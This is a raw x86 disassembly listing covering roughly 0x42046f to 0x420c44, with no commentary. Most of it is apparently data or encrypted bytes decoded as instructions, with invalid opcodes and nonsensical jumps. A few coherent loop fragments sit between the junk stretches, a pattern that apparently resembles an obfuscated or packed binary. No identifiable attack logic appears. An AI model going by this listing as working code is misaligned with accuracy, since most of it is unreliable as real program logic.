  42046f:	dec    edi
  420470:	ins    DWORD PTR es:[edi],dx
  420471:	pop    esp
  420472:	lahf   
  420473:	shl    al,0xa3
  420476:	fld    DWORD PTR [edx]
  420478:	ror    BYTE PTR [ebx],0x80
  42047b:	add    al,0xca
  42047d:	xor    BYTE PTR [edx+0x38f44380],0xc2
  420484:	dec    ebp
  420485:	or     BYTE PTR [eax],cl
  420487:	shr    BYTE PTR ds:0x2218023c,cl
  42048d:	ficom  DWORD PTR [ecx+ecx*1]
  420490:	xchg   ebx,eax
  420491:	mov    eax,ds:0x4342b843
  420496:	je     0x4204b1
  420498:	mov    ds:0x7d8fdf3d,eax
  42049d:	leave  
  42049e:	fstp   TBYTE PTR [edi-0x7f]
  4204a1:	cwde   
  4204a2:	psubq  mm4,QWORD PTR [ebx+0x42da1d3f]
  4204a9:	fsubr  DWORD PTR [ebp-0x38]
  4204ac:	push   ds
  4204ad:	nop
  4204ae:	cmc    
  4204af:	xor    eax,0x67772b9
  4204b4:	jnp    0x420473
  4204b6:	es ds sahf 
  4204b9:	pop    ebx
  4204ba:	sub    DWORD PTR [edi],eax
  4204bc:	push   eax
  4204bd:	sub    eax,0x27bf79f8
  4204c2:	fcomp  DWORD PTR [eax+edi*4+0x11]
  4204c6:	and    edi,ebx
  4204c8:	ins    WORD PTR es:[edi],dx
  4204ca:	hlt    
  4204cb:	(bad)  
  4204cd:	bound  ebx,QWORD PTR [esi]
  4204cf:	dec    edx
  4204d0:	cmp    BYTE PTR [edx-0x652f8420],0x97
  4204d7:	(bad)  
  4204d8:	ss adc al,0x3b
  4204db:	dec    bl
  4204dd:	xchg   ebx,ebp
  4204df:	mov    ds:0x433c2ba,eax
  4204e4:	sbb    bl,BYTE PTR [eax-0x761f2e09]
  4204ea:	or     ah,bl
  4204ec:	je     0x4204f9
  4204ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204ef:	jecxz  0x4204a4
  4204f1:	loop   0x42049b
  4204f3:	adc    BYTE PTR [edi+0x50e79c61],cl
  4204f9:	ret    
  4204fa:	add    BYTE PTR [edi-0x62],al
  4204fd:	inc    BYTE PTR [ecx]
  4204ff:	dec    ebx
  420500:	shl    ah,cl
  420502:	arpl   WORD PTR [edi+0x2610bdc4],si
  420508:	jbe    0x4204ba
  42050a:	add    cl,bl
  42050c:	ins    BYTE PTR es:[edi],dx
  42050d:	out    dx,al
  42050e:	aaa    
  42050f:	xchg   ebx,eax
  420510:	call   0x16ae7271
  420515:	(bad)  
  420517:	jmp    0x27edea28
  42051c:	jmp    0x42055f
  42051e:	mov    cs,WORD PTR [eax+0x58]
  420521:	scas   eax,DWORD PTR es:[edi]
  420522:	ja     0x4204c2
  420524:	and    dh,BYTE PTR [edi-0x47]
  420527:	pop    esi
  420528:	pop    esi
  420529:	xor    ebp,DWORD PTR [edx-0x45]
  42052c:	stos   DWORD PTR es:[edi],eax
  42052d:	jmp    0x420505
  42052f:	jmp    0x3bae:0x5e7e0424
  420536:	push   esi
  420537:	clc    
  420538:	pop    ebp
  420539:	or     edx,ebp
  42053b:	pop    edi
  42053c:	hlt    
  42053d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42053e:	fs pop ebx
  420540:	mov    al,BYTE PTR [esi]
  420542:	gs hlt 
  420544:	in     eax,dx
  420545:	sub    ecx,DWORD PTR [esp+edx*4]
  420548:	sbb    DWORD PTR [ebp+0x5c847178],esp
  42054e:	imul   esi,ebp,0xa76d0e97
  420554:	paddw  mm3,QWORD PTR [edx+edi*8+0x7d35123f]
  42055c:	mov    ds,esp
  42055e:	push   esp
  42055f:	div    DWORD PTR [ebx-0x60]
  420562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420563:	or     DWORD PTR [eax-0x6fa4b306],edi
  420569:	mov    WORD PTR [esi],ss
  42056b:	mov    eax,0xcd2c82f9
  420570:	mov    edx,DWORD PTR [eax]
  420572:	push   es
  420573:	mov    edi,0x32c90d80
  420578:	loopne 0x420508
  42057a:	pop    esp
  42057b:	out    0xf6,al
  42057d:	pop    ebp
  42057e:	test   eax,0xc4feb24f
  420583:	aaa    
  420584:	cmp    eax,0x75b61c9f
  420589:	dec    esi
  42058a:	jns    0x420569
  42058c:	pusha  
  42058d:	(bad)  
  42058e:	pop    eax
  42058f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420590:	push   ss
  420591:	jp     0x4205cf
  420593:	pop    ecx
  420594:	xchg   ebx,eax
  420595:	daa    
  420596:	pop    edx
  420597:	mov    edx,0xc1c03899
  42059c:	jmp    0x3344b9da
  4205a1:	xlat   BYTE PTR ds:[ebx]
  4205a2:	inc    eax
  4205a3:	(bad)  
  4205a4:	repz push ebp
  4205a6:	in     eax,dx
  4205a7:	popa   
  4205a8:	repnz or al,0x3e
  4205ab:	ins    DWORD PTR es:[edi],dx
  4205ac:	dec    ebp
  4205ad:	fcmovnu st,st(1)
  4205af:	and    BYTE PTR [esi+ebx*4+0x795dbf82],bl
  4205b6:	add    al,0x77
  4205b8:	fild   WORD PTR [esp+ebp*8]
  4205bb:	mov    ecx,?
  4205bd:	lods   eax,DWORD PTR ds:[esi]
  4205be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205bf:	(bad)  
  4205c0:	jno    0x420597
  4205c2:	mov    WORD PTR [edi+0x15f381b],?
  4205c8:	mul    BYTE PTR [edx+0x63231f90]
  4205ce:	jns    0x420625
  4205d0:	scas   eax,DWORD PTR es:[edi]
  4205d1:	sub    eax,0xa45ae97d
  4205d6:	in     al,0xc7
  4205d8:	out    0x10,eax
  4205da:	inc    edi
  4205db:	mov    edi,0x2d233db5
  4205e0:	repz shr DWORD PTR [eax+0x2f],cl
  4205e4:	cli    
  4205e5:	add    ebp,esi
  4205e7:	mov    al,ds:0x76e19ef3
  4205ec:	stc    
  4205ed:	enter  0x15,0x38
  4205f1:	inc    esi
  4205f2:	mov    DWORD PTR [esi+0x1cf76bee],ebp
  4205f8:	push   ebx
  4205f9:	jno    0x42061a
  4205fb:	cwde   
  4205fc:	mov    ebp,ebx
  4205fe:	dec    esi
  4205ff:	outs   dx,DWORD PTR ds:[esi]
  420600:	push   ebp
  420601:	or     al,0xe7
  420603:	js     0x4205c0
  420605:	gs fs mov ecx,0xee0ea05a
  42060c:	jg     0x4205cd
  42060e:	pop    ds
  42060f:	mov    cl,0x8e
  420611:	adc    al,0xa
  420613:	scas   eax,DWORD PTR es:[edi]
  420614:	inc    edi
  420615:	stos   DWORD PTR es:[edi],eax
  420616:	xor    ebx,DWORD PTR [esi+eax*4-0x7d9b564f]
  42061d:	pop    esi
  42061e:	imul   edx,DWORD PTR [eax+0x1],0x7b
  420622:	mov    esp,0xeea608e5
  420627:	sbb    ebp,esi
  420629:	popa   
  42062a:	retf   
  42062b:	mov    ch,0xeb
  42062d:	or     ebp,ebp
  42062f:	ror    DWORD PTR [esi-0x57],0x16
  420633:	lods   al,BYTE PTR ds:[esi]
  420634:	(bad)  
  420635:	mov    edx,0x71b2e0d3
  42063a:	gs mov bl,0x85
  42063d:	jmp    0x4f8d:0x7e082eff
  420644:	je     0x42064d
  420646:	push   esp
  420647:	push   esp
  420648:	ret    0x60f2
  42064b:	mov    al,ds:0x785b8012
  420650:	push   cs
  420651:	cmp    DWORD PTR [eax+ebp*4-0x24],edi
  420655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420656:	int    0xc0
  420658:	ins    BYTE PTR es:[edi],dx
  420659:	mov    esi,0x62026e3a
  42065e:	arpl   WORD PTR [esi-0x69],dx
  420661:	add    eax,ebx
  420663:	jle    0x42068b
  420665:	into   
  420666:	fwait
  420667:	pop    esi
  420668:	out    dx,al
  420669:	dec    edx
  42066a:	pop    eax
  42066b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42066c:	lea    edi,[edi]
  42066e:	outs   dx,DWORD PTR ds:[esi]
  42066f:	imul   ebx,edx,0x2f
  420672:	cmp    BYTE PTR [ebx+0x56],ch
  420675:	sbb    cl,al
  420677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420678:	inc    eax
  420679:	add    esi,DWORD PTR [edi+0x75d6d119]
  42067f:	scas   eax,DWORD PTR es:[edi]
  420680:	cdq    
  420681:	pop    ecx
  420682:	push   0xe2066094
  420687:	fimul  WORD PTR [eax]
  420689:	shl    BYTE PTR [edx+0x1f7963ef],0xfc
  420690:	int3   
  420691:	mov    ebp,0xfd844ac9
  420696:	popf   
  420697:	sub    DWORD PTR [edx],0xffffffa7
  42069a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42069b:	mov    eax,ds:0x1abaafc3
  4206a0:	fwait
  4206a1:	jecxz  0x420671
  4206a3:	retf   0xe12f
  4206a6:	xor    al,0x80
  4206a8:	cmp    BYTE PTR [ebp-0x40760275],bh
  4206ae:	test   BYTE PTR [eax+0x4a],dh
  4206b1:	js     0x420687
  4206b3:	xchg   esp,eax
  4206b4:	int    0x0
  4206b6:	clc    
  4206b7:	jb     0x42072a
  4206b9:	pop    ss
  4206ba:	retf   0x4daa
  4206bd:	fild   WORD PTR [edx-0x5b560071]
  4206c3:	(bad)  
  4206c4:	out    0x2b,eax
  4206c6:	in     al,0xa9
  4206c8:	push   ebx
  4206c9:	mov    cl,0xa5
  4206cb:	cmp    BYTE PTR [edx+0x66],bl
  4206ce:	js     0x42066d
  4206d0:	aam    0x3c
  4206d2:	mov    al,0xdc
  4206d4:	xchg   ebp,eax
  4206d5:	mov    esi,0xec725730
  4206da:	retf   
  4206db:	fwait
  4206dc:	add    BYTE PTR [eax-0x51821e55],bl
  4206e2:	ret    
  4206e3:	xchg   BYTE PTR [edx+0x1f877402],dl
  4206e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ea:	mov    eax,ds:0xd9b40ddc
  4206ef:	or     al,0xd2
  4206f1:	loopne 0x4206ed
  4206f3:	push   ebx
  4206f4:	sub    dl,bl
  4206f6:	dec    ebp
  4206f7:	mov    dh,0xd2
  4206f9:	jnp    0x4206a3
  4206fb:	cmp    ah,BYTE PTR ds:0xf005b545
  420701:	lea    edi,[edx]
  420703:	das    
  420704:	or     al,BYTE PTR [edi+eiz*8+0xe368518]
  42070b:	push   ebx
  42070c:	out    dx,eax
  42070d:	pusha  
  42070e:	fsin   
  420710:	pop    ebp
  420711:	pop    eax
  420712:	xadd   esi,ecx
  420715:	mov    edi,DWORD PTR [ebp-0x18c19287]
  42071b:	cmc    
  42071c:	sti    
  42071d:	pop    esp
  42071e:	or     dh,dl
  420720:	push   ss
  420721:	push   ss
  420722:	aaa    
  420723:	push   ss
  420724:	pop    esp
  420725:	adc    esp,esp
  420727:	add    BYTE PTR [ebx+0x69],cl
  42072a:	pop    ebx
  42072b:	sbb    eax,0xd50c9f55
  420730:	push   edi
  420731:	xchg   ecx,eax
  420732:	inc    esp
  420733:	jmp    0x23a6f81f
  420738:	sub    al,0x44
  42073a:	push   0x2a
  42073c:	mov    edx,0x2798c145
  420741:	and    ebx,ebp
  420743:	stos   DWORD PTR es:[edi],eax
  420744:	jmp    DWORD PTR [ebx-0x65]
  420747:	jmp    0x420714
  420749:	xchg   esp,eax
  42074a:	or     eax,0xf28190ed
  42074f:	fisubr DWORD PTR [ebp+0x0]
  420752:	add    BYTE PTR [ebx-0x1074b],cl
  420758:	jmp    DWORD PTR [ebx]
  42075a:	(bad)  
  42075b:	and    edx,0xe0c
  420761:	or     edx,0x5b
  420764:	mov    esi,DWORD PTR [ebp-0xe8]
  42076a:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42076e:	add    ecx,eax
  420770:	lea    eax,[edx+ecx*1-0xc5b]
  420777:	mov    DWORD PTR [ebp-0xa8],eax
  42077d:	and    DWORD PTR [ebp-0x144],0x0
  420784:	jmp    0x420b7d
  420789:	mov    eax,DWORD PTR [ebp-0x144]
  42078f:	inc    eax
  420790:	mov    DWORD PTR [ebp-0x144],eax
  420796:	jmp    0x420b7d
  42079b:	daa    
  42079c:	cmp    eax,0x75b775ce
  4207a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a2:	(bad)  
  4207a3:	xchg   ecx,eax
  4207a4:	(bad)  
  4207a5:	dec    esi
  4207a6:	sahf   
  4207a7:	mov    edx,0x7c90cf73
  4207ac:	mov    ds:0xc44abec0,eax
  4207b1:	mov    esi,0x39e67be
  4207b6:	les    esi,FWORD PTR [esi-0x3e]
  4207b9:	loope  0x42082d
  4207bb:	cmp    dl,BYTE PTR [esi+0x1cecd071]
  4207c1:	add    BYTE PTR [ebx],ah
  4207c3:	(bad)  
  4207c4:	(bad)  
  4207c5:	dec    esi
  4207c6:	or     eax,0x281e64fb
  4207cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207cc:	outs   dx,BYTE PTR ds:[esi]
  4207cd:	and    BYTE PTR [ebx+ecx*4+0x5],bh
  4207d1:	and    DWORD PTR [edx-0x2524e608],esp
  4207d7:	shl    BYTE PTR [esi-0x2d],cl
  4207da:	fnstenv [esi+0x74]
  4207dd:	push   esi
  4207de:	sbb    DWORD PTR [esi],esp
  4207e0:	xchg   edx,eax
  4207e1:	sub    ecx,DWORD PTR [ecx-0x32a5233e]
  4207e7:	in     al,dx
  4207e8:	out    0x50,al
  4207ea:	xchg   edx,eax
  4207eb:	or     dl,BYTE PTR [ebx+0x46]
  4207ee:	imul   edx,DWORD PTR [ebp+0x1f5275fc],0x9fa8a009
  4207f8:	or     BYTE PTR [ecx+0x4e6bb464],bl
  4207fe:	push   0x54
  420800:	add    al,BYTE PTR ds:0xd0db6c15
  420806:	daa    
  420807:	jae    0x42085f
  420809:	add    DWORD PTR [ecx],edx
  42080b:	cdq    
  42080c:	loope  0x4207a2
  42080e:	sar    BYTE PTR es:[ebx-0x1c],1
  420812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420813:	xchg   edi,eax
  420814:	dec    ecx
  420815:	xor    ch,BYTE PTR [ecx-0x18]
  420818:	xor    ah,BYTE PTR [ebx]
  42081a:	sahf   
  42081b:	adc    eax,0xfada1aad
  420820:	ret    0x53fa
  420823:	sub    ebp,DWORD PTR [ebx+0xa669c5e]
  420829:	lahf   
  42082a:	cmp    al,0x36
  42082c:	sub    BYTE PTR [ecx],ah
  42082e:	jmp    0x420829
  420830:	jae    0x4207e7
  420832:	(bad)  
  420833:	mov    eax,ds:0x84739ce9
  420838:	(bad)  
  420839:	imul   ebp,DWORD PTR [edi],0x6ce72557
  42083f:	mov    al,ds:0x33df84b8
  420844:	ins    BYTE PTR es:[edi],dx
  420845:	mov    ebp,0xc6999388
  42084a:	je     0x42086b
  42084c:	dec    edx
  42084d:	cmp    eax,0x38831a2e
  420852:	and    esp,DWORD PTR [esi]
  420854:	ins    DWORD PTR es:[edi],dx
  420855:	(bad)  
  420856:	mov    ah,ch
  420858:	int3   
  420859:	push   esp
  42085a:	cs jmp 0x6b9c:0x61072ed9
  420862:	mov    dl,0xb3
  420864:	lock (bad) 
  420866:	das    
  420867:	retf   0x68a5
  42086a:	adc    esi,esp
  42086c:	ror    edi,cl
  42086e:	rcr    BYTE PTR [ecx],cl
  420870:	ret    0x7d9e
  420873:	adc    DWORD PTR ds:0x57bdcbba,0xfffffff2
  42087a:	stos   DWORD PTR es:[edi],eax
  42087b:	mov    BYTE PTR [ebp+0x59],bh
  42087e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42087f:	jmp    0x420834
  420881:	test   eax,0xb74e6cd0
  420886:	push   ecx
  420887:	adc    BYTE PTR [esp+eax*2+0x15],cl
  42088b:	fisttp QWORD PTR [ecx]
  42088d:	fsub   DWORD PTR [ebx+0x74ff270b]
  420893:	outs   dx,BYTE PTR ds:[esi]
  420894:	dec    eax
  420895:	js     0x4208f5
  420897:	aaa    
  420898:	enter  0x29c8,0xde
  42089c:	push   ebp
  42089d:	sub    eax,0x6a9560fd
  4208a2:	test   DWORD PTR [ecx],esp
  4208a4:	into   
  4208a5:	popf   
  4208a6:	loope  0x42086d
  4208a8:	ror    BYTE PTR ds:0xa2fae3bb,cl
  4208ae:	imul   ebx,ebp,0xdc7b2093
  4208b4:	xchg   ebx,eax
  4208b5:	pop    edi
  4208b6:	sub    esi,DWORD PTR [ecx+0x5a76cc50]
  4208bc:	mul    ecx
  4208be:	sub    al,0xa
  4208c0:	es es popa 
  4208c3:	push   ecx
  4208c4:	push   eax
  4208c5:	fldenv [eax]
  4208c7:	add    eax,0x7628ee32
  4208cc:	push   esp
  4208cd:	sbb    BYTE PTR [edi-0x29d7708d],ah
  4208d3:	fadd   DWORD PTR [esp+ebx*2]
  4208d6:	(bad)  
  4208d7:	and    bl,ah
  4208d9:	jmp    0x5182:0xc7c4b187
  4208e0:	fstp   st(1)
  4208e2:	jmp    0x420889
  4208e4:	sub    DWORD PTR [edx+0x6d9cb4d0],ebx
  4208ea:	push   ecx
  4208eb:	inc    esi
  4208ec:	or     edi,ebp
  4208ee:	mov    WORD PTR [edx],?
  4208f0:	retf   
  4208f1:	xchg   esp,eax
  4208f2:	hlt    
  4208f3:	test   al,0x84
  4208f5:	jg     0x420892
  4208f7:	sub    ch,cl
  4208f9:	jns    0x420942
  4208fb:	scas   eax,DWORD PTR es:[edi]
  4208fc:	push   es
  4208fd:	jmp    0x6ad1621e
  420902:	fst    QWORD PTR [esi-0x24]
  420905:	mov    WORD PTR [ebx-0x71efaed6],es
  42090b:	add    al,ah
  42090d:	outs   dx,BYTE PTR ds:[esi]
  42090e:	sahf   
  42090f:	inc    ecx
  420910:	lods   eax,DWORD PTR ds:[esi]
  420911:	xchg   edi,eax
  420912:	mov    eax,0xee848f0c
  420917:	push   0x70d4ae76
  42091c:	repnz (bad) [ecx]
  42091f:	mov    al,ds:0x114b9105
  420924:	cmp    esi,0xd
  420927:	jge    0x420950
  420929:	fbld   TBYTE PTR [ebx]
  42092b:	mov    bl,0x66
  42092d:	call   0x68e20fb0
  420932:	jge    0x420958
  420934:	outs   dx,BYTE PTR ds:[esi]
  420935:	pshufw mm7,QWORD PTR [esi],0x1b
  420939:	mov    al,0xb1
  42093b:	dec    eax
  42093c:	adc    al,0xf
  42093e:	mov    ds:0xc005f6e8,eax
  420943:	dec    edi
  420944:	push   ebx
  420945:	in     eax,dx
  420946:	aad    0x86
  420948:	adc    ebp,DWORD PTR [edx]
  42094a:	not    esp
  42094c:	mov    esp,0x6e630bb
  420951:	std    
  420952:	sbb    eax,0xd10e1cd7
  420957:	stos   DWORD PTR es:[edi],eax
  420958:	inc    eax
  420959:	cmp    eax,0xb9ff523
  42095e:	ss jecxz 0x420964
  420961:	pop    eax
  420962:	aad    0xe1
  420964:	push   0xffffffef
  420966:	inc    eax
  420967:	xchg   ebp,eax
  420968:	enter  0x6a20,0x89
  42096c:	jne    0x4209ad
  42096e:	pop    esp
  42096f:	sbb    dh,BYTE PTR [eax+0x3697930c]
  420975:	xchg   DWORD PTR [ebx+0x7d],edx
  420978:	dec    ecx
  420979:	fstp   st(3)
  42097b:	sti    
  42097c:	mov    edi,0x888b1bb6
  420981:	(bad)  
  420982:	jmp    0x4209f4
  420984:	mov    ah,0xb9
  420986:	imul   ebp,DWORD PTR [edi+0x43],0xffffff96
  42098a:	fcom   QWORD PTR [edx-0x67]
  42098d:	sbb    eax,0x58d58aa3
  420992:	(bad)  
  420993:	repnz pop ds
  420995:	pop    es
  420996:	leave  
  420997:	stos   BYTE PTR es:[edi],al
  420998:	popf   
  420999:	adc    DWORD PTR [ecx-0x1f],esp
  42099c:	xor    eax,0xa7c13bb1
  4209a1:	xor    ecx,ebp
  4209a3:	(bad)  
  4209a4:	adc    eax,0x61b6c866
  4209a9:	mov    ch,0x6b
  4209ab:	or     eax,0x61ac20f4
  4209b0:	mov    eax,esi
  4209b2:	test   BYTE PTR [ebx],ch
  4209b4:	inc    ebx
  4209b5:	push   eax
  4209b6:	inc    ecx
  4209b7:	push   cs
  4209b8:	add    bh,BYTE PTR [edi+edi*1]
  4209bb:	(bad)  
  4209bc:	add    eax,eax
  4209be:	or     eax,eax
  4209c0:	mov    ah,0x8e
  4209c2:	jb     0x4209cf
  4209c4:	imul   edi,DWORD PTR [esi-0x6294e10e],0xef10d601
  4209ce:	lock add eax,0x39e2eddd
  4209d4:	push   esp
  4209d5:	add    al,0xa2
  4209d7:	and    BYTE PTR [ebx],al
  4209d9:	mov    dl,0xf7
  4209db:	in     eax,dx
  4209dc:	clc    
  4209dd:	bound  ebx,QWORD PTR [eax+0xe]
  4209e0:	pop    ecx
  4209e1:	add    BYTE PTR [eax+0x94b9e05],bl
  4209e7:	sar    DWORD PTR [edi+0x9],cl
  4209ea:	enter  0x4ec9,0x23
  4209ee:	dec    eax
  4209ef:	call   esp
  4209f1:	jg     0x420a4b
  4209f3:	mov    eax,ds:0x22a5dc09
  4209f8:	rcl    BYTE PTR [edi+0x70],cl
  4209fb:	in     al,0xdb
  4209fd:	stos   BYTE PTR es:[edi],al
  4209fe:	fldcw  WORD PTR [ebp-0x7917f3a]
  420a04:	sbb    al,BYTE PTR [edi]
  420a06:	jg     0x420a76
  420a08:	fiadd  DWORD PTR [edx+eiz*1]
  420a0b:	sub    DWORD PTR [esi-0x29],edx
  420a0e:	movsx  ecx,WORD PTR [edi-0xf]
  420a12:	pop    es
  420a13:	ror    BYTE PTR [edi+0x6236f7d5],cl
  420a19:	nop
  420a1a:	xchg   ebx,eax
  420a1b:	xor    DWORD PTR [eax-0x2e6ab7d1],ecx
  420a21:	xor    esp,DWORD PTR [ecx]
  420a23:	cmc    
  420a24:	xchg   ebp,eax
  420a25:	mov    dh,0xcf
  420a27:	and    BYTE PTR [edx-0x150a87a],ah
  420a2d:	adc    eax,0x3c0aab85
  420a32:	mov    ds,WORD PTR [ebx+0x5e]
  420a35:	push   es
  420a36:	xchg   esp,eax
  420a37:	in     eax,0xf4
  420a39:	ss add al,0x4f
  420a3c:	cdq    
  420a3d:	cmp    eax,0x97ee6dab
  420a42:	jle    0x4209ef
  420a44:	and    eax,0x4f3c567c
  420a49:	stos   BYTE PTR es:[edi],al
  420a4a:	dec    edi
  420a4b:	sbb    DWORD PTR [esp+ecx*2+0x78],ebp
  420a4f:	inc    ebp
  420a50:	dec    esp
  420a51:	adc    BYTE PTR ds:0xf1e73eb2,0x41
  420a58:	push   ds
  420a59:	scas   al,BYTE PTR es:[edi]
  420a5a:	adc    eax,0x55e5a085
  420a5f:	push   esi
  420a61:	cmp    eax,0xebb844af
  420a66:	cs mov cx,0xd5b1
  420a6b:	les    esp,FWORD PTR [esi+0xe]
  420a6e:	adc    esp,ebp
  420a70:	out    dx,eax
  420a71:	jmp    0x420adf
  420a73:	dec    edx
  420a74:	jge    0x420a01
  420a76:	adc    al,0xed
  420a78:	push   ss
  420a79:	fsubr  DWORD PTR ss:[ebx-0x1b065797]
  420a80:	mov    DWORD PTR [edi-0x67bfe429],ecx
  420a86:	ror    DWORD PTR [ebp-0x6cf3f7ad],0x9e
  420a8d:	xor    eax,0x445c5d44
  420a92:	push   esp
  420a93:	xlat   BYTE PTR ds:[ebx]
  420a94:	(bad)  
  420a95:	push   esi
  420a96:	or     BYTE PTR [edx-0x135e4dfa],0x64
  420a9d:	cwde   
  420a9e:	outs   dx,DWORD PTR ds:[esi]
  420a9f:	jmp    0x985855fe
  420aa4:	or     bl,bl
  420aa6:	adc    DWORD PTR [ebx+0x4a],edx
  420aa9:	sub    bh,bl
  420aab:	cmp    al,0x57
  420aad:	aas    
  420aae:	jl     0x420a49
  420ab0:	mov    ecx,edi
  420ab2:	sahf   
  420ab3:	dec    ebp
  420ab4:	mov    bh,0xd1
  420ab6:	stos   DWORD PTR es:[edi],eax
  420ab7:	scas   eax,DWORD PTR es:[edi]
  420ab8:	sbb    BYTE PTR [ebx-0x46860df7],0xd6
  420abf:	push   esp
  420ac0:	mov    bl,BYTE PTR [esi+0x16]
  420ac3:	call   0xf742357c
  420ac8:	push   esp
  420ac9:	or     bl,BYTE PTR [esi]
  420acb:	stos   BYTE PTR es:[edi],al
  420acc:	pop    ecx
  420acd:	aam    0xd9
  420acf:	mov    WORD PTR [ecx+0x6fe7128c],fs
  420ad5:	mov    ch,0x16
  420ad7:	scas   al,BYTE PTR es:[edi]
  420ad8:	xor    DWORD PTR [esp+esi*4-0x78e9d88b],esp
  420adf:	xor    eax,0x77eafeea
  420ae4:	and    BYTE PTR [edx-0x4145fa60],bh
  420aea:	addr16 ss jg 0x420b0b
  420aee:	pop    esi
  420aef:	push   esp
  420af0:	cmp    esi,ebp
  420af2:	pushf  
  420af3:	inc    edi
  420af4:	pop    edi
  420af5:	stos   DWORD PTR es:[edi],eax
  420af6:	lds    ecx,FWORD PTR [esi+ecx*4]
  420af9:	imul   esi,DWORD PTR [eax-0x42a1e293],0x44
  420b00:	jae    0x420b7b
  420b02:	sbb    DWORD PTR [ebx],ecx
  420b04:	fwait
  420b05:	shl    esi,1
  420b07:	int3   
  420b08:	jmp    0x5bba51fd
  420b0d:	jl     0x420b12
  420b0f:	mov    al,0x11
  420b11:	cdq    
  420b12:	dec    esi
  420b13:	(bad)  
  420b14:	rcl    DWORD PTR [edx-0x61],cl
  420b17:	retf   0xf41c
  420b1a:	les    ebp,FWORD PTR [ebp-0x13]
  420b1d:	and    al,0xc2
  420b1f:	mov    bh,0x88
  420b21:	sub    eax,0x58143497
  420b26:	mov    ah,BYTE PTR [ebp-0x23840f65]
  420b2c:	adc    DWORD PTR [ebp-0x7d3f69fa],ebx
  420b32:	daa    
  420b33:	fwait
  420b34:	out    0xf9,eax
  420b36:	(bad)  
  420b37:	fild   QWORD PTR [edi]
  420b39:	mov    ebp,0xd12f189a
  420b3e:	pop    esi
  420b3f:	(bad)  
  420b40:	shr    DWORD PTR [eax+0xe1db680],0xf9
  420b47:	out    dx,al
  420b48:	xlat   BYTE PTR gs:[ebx]
  420b4a:	les    ebx,FWORD PTR [ebp+0x79d9fba5]
  420b50:	seto   bl
  420b53:	mov    ebx,0x44446b35
  420b58:	in     eax,dx
  420b59:	pop    ebp
  420b5a:	dec    ebp
  420b5b:	in     al,0xb7
  420b5d:	push   es
  420b5e:	jle    0x420b9a
  420b60:	retf   
  420b61:	(bad)  
  420b62:	(bad)  
  420b64:	jmp    0x52b8bc27
  420b69:	add    DWORD PTR [ebp+0x5e],edx
  420b6c:	mov    esi,0xd1deb181
  420b71:	jne    0x420af8
  420b73:	xchg   esp,edx
  420b75:	cmp    edx,0xffffff81
  420b78:	mov    dh,0x0
  420b7a:	sub    dh,cl
  420b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b7d:	mov    eax,DWORD PTR [ebp-0xe8]
  420b83:	mov    ecx,DWORD PTR [ebp-0x144]
  420b89:	jmp    0x420f70
  420b8e:	jo     0x420be5
  420b90:	mov    es,WORD PTR [eax+edi*4-0x74]
  420b94:	mov    ah,0x79
  420b96:	rcl    ah,cl
  420b98:	mov    WORD PTR [esi+ecx*4+0x8cfb0ff],fs
  420b9f:	stos   DWORD PTR es:[edi],eax
  420ba0:	sar    BYTE PTR [esi-0x41413bb6],0xd6
  420ba7:	in     eax,dx
  420ba8:	add    cl,0x2d
  420bab:	rcr    BYTE PTR [edi-0x7b],1
  420bae:	ds inc bp
  420bb1:	test   eax,0xebe69c0a
  420bb6:	loope  0x420bbd
  420bb8:	add    BYTE PTR [esi],al
  420bba:	pop    edi
  420bbb:	in     eax,dx
  420bbc:	stos   DWORD PTR es:[edi],eax
  420bbd:	outs   dx,DWORD PTR ds:[esi]
  420bbe:	mov    ah,0x59
  420bc0:	stc    
  420bc1:	mov    edx,0xfe71f03e
  420bc6:	sti    
  420bc7:	js     0x420c18
  420bc9:	test   DWORD PTR [edi],esp
  420bcb:	or     al,0x83
  420bcd:	jae    0x420b57
  420bcf:	sbb    bl,BYTE PTR ds:0xed31ad81
  420bd5:	add    ch,0xa4
  420bd8:	in     eax,dx
  420bd9:	outs   dx,DWORD PTR ds:[esi]
  420bda:	jp     0x420bf4
  420bdc:	sbb    dh,ah
  420bde:	inc    ebx
  420bdf:	and    eax,0xfb392bac
  420be4:	es lahf 
  420be6:	push   ebp
  420be7:	popf   
  420be8:	mov    esi,0x76afbfa0
  420bed:	stos   BYTE PTR es:[edi],al
  420bee:	jo     0x420bb8
  420bf0:	inc    eax
  420bf1:	aad    0x35
  420bf3:	jns    0x420bb8
  420bf5:	xor    al,BYTE PTR [edx-0x2df0d505]
  420bfb:	sub    dh,BYTE PTR [esi]
  420bfd:	mov    dh,0x9d
  420bff:	mov    cl,0x15
  420c01:	mov    dh,0x7
  420c03:	sbb    DWORD PTR [esi+0x19],eax
  420c06:	lods   eax,DWORD PTR ds:[esi]
  420c07:	adc    eax,0x48abb729
  420c0c:	fst    QWORD PTR [eax]
  420c0e:	lahf   
  420c0f:	jle    0x420c5e
  420c11:	xor    bh,BYTE PTR [esi-0x21]
  420c14:	jb     0x420be2
  420c16:	push   es
  420c17:	pusha  
  420c18:	call   0x7db826bb
  420c1d:	out    0x8,eax
  420c1f:	xor    al,0xf1
  420c21:	and    al,0x1e
  420c23:	hlt    
  420c24:	pop    edi
  420c25:	cmp    bh,BYTE PTR [ecx]
  420c27:	push   ecx
  420c28:	xor    ebx,DWORD PTR [esi-0x5]
  420c2b:	int3   
  420c2c:	xchg   esi,eax
  420c2d:	adc    dh,cl
  420c2f:	mov    ecx,0xa5c1ffd0
  420c34:	cmp    ah,dl
  420c36:	call   0xb54a6640
  420c3b:	gs in  eax,0xbe
  420c3e:	push   es
  420c3f:	rol    esi,1
  420c41:	fs adc ebp,eax
  420c44:	aad    0x4
